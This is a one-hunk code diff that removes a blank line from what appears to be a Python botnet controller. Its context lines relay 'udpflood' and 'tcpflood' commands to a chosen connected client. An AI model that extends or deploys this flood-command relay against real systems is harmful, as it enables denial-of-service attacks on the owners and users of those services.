@@ -138,7 +138,6 @@ def main():
 									except:
 										q.send("[ERROR] Client closed the connection\n")
 										break
-
 								elif ("udpflood " in data or "tcpflood " in data):
 									try:
 										allConnections[chosenone].send(data)
